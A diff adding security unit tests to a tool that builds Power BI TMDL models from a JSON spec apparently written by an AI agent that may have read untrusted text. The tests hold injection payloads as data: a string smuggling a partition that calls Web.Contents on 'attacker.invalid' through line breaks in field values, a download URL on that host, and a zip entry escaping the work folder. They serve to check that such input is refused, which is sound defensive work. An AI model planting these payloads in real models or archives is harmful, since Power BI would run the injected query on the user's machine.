@@ -89,5 +89,77 @@ class InjectTest(unittest.TestCase):
             self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
 
 
+EVIL = '\n\tpartition Evil = m\n\t\tmode: import\n\t\tsource = Web.Contents("https://attacker.invalid")\n\tmeasure Absorb = 1'
+
+
+def run_args(tmp, *args):
+    return subprocess.run([sys.executable, SCRIPT, *args], capture_output=True, text=True,
+                          encoding="utf-8")
+
+
+@unittest.skipUnless(os.path.isdir(MASTER), "lab/contoso not present (installed plugin)")
+class SecurityTest(unittest.TestCase):
+    """The spec is written by an agent that may have read untrusted text. A refresh in Power BI
+    runs Power Query, so anything that gets a partition into the TMDL runs on the user's
+    machine. Payloads from the DeepSeek review of 2026-10-05."""
+
+    def measure(self, **over):
+        m = {"name": "Safe", "expression": "[Total Sales]"}
+        m.update(over)
+        return {"title": "attack", "measures": [m]}
+
+    def assertRefused(self, spec, why):
+        with tempfile.TemporaryDirectory() as tmp:
+            r = run(spec, tmp)
+            self.assertNotEqual(r.returncode, 0, r.stdout)
+            self.assertIn(why, r.stderr)
+            self.assertFalse(os.path.exists(os.path.join(tmp, "out")))
+
+    def test_line_break_in_format_string_is_refused(self):
+        self.assertRefused(self.measure(formatString="0" + EVIL), "formatString contains a line break")
+
+    def test_unicode_line_separator_in_format_string_is_refused(self):
+        self.assertRefused(self.measure(formatString="0 \tpartition Evil = m"),
+                           "formatString contains a line break")
+
+    def test_line_break_in_name_is_refused(self):
+        self.assertRefused(self.measure(name="X' = 1" + EVIL), "name contains a line break")
+
+    def test_lone_carriage_return_in_expression_stays_inside_the_expression(self):
+        # Accepted on purpose: normalized, the \r lines become indented expression lines. If
+        # the indent ever stopped applying, this partition would sit at table level.
+        spec = self.measure(expression="1\r\tpartition Evil = 1\r")
+        with tempfile.TemporaryDirectory() as tmp:
+            r = run(spec, tmp)
+            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+            with zipfile.ZipFile(os.path.join(tmp, "out", "dax-example-attack.zip")) as z:
+                tmdl = z.read("contoso/Contoso.SemanticModel/definition/tables/_Measures.tmdl").decode()
+        self.assertNotIn("\r", tmdl)
+        self.assertEqual(tmdl.count("\n\tpartition "), 1, "a second partition got in")
+        self.assertIn("\n\t\t\t\tpartition Evil = 1", tmdl)   # indented: part of the expression
+
+    def test_master_url_other_than_the_release_is_refused(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            spec = os.path.join(tmp, "spec.json")
+            with open(spec, "w", encoding="utf-8") as f:
+                json.dump(GOOD, f)
+            r = run_args(tmp, spec, "--out", os.path.join(tmp, "out"),
+                         "--master", "https://attacker.invalid/lab-contoso.zip")
+            self.assertNotEqual(r.returncode, 0)
+            self.assertIn("--master URL must be", r.stderr)
+
+    def test_zip_entry_outside_the_work_folder_is_refused(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            evil = os.path.join(tmp, "evil.zip")
+            with zipfile.ZipFile(evil, "w") as z:
+                z.writestr("../escaped.txt", "x")
+            spec = os.path.join(tmp, "spec.json")
+            with open(spec, "w", encoding="utf-8") as f:
+                json.dump(GOOD, f)
+            r = run_args(tmp, spec, "--out", os.path.join(tmp, "out"), "--master", evil)
+            self.assertNotEqual(r.returncode, 0)
+            self.assertIn("escapes the work folder", r.stderr)
+
+
 if __name__ == "__main__":
     unittest.main()
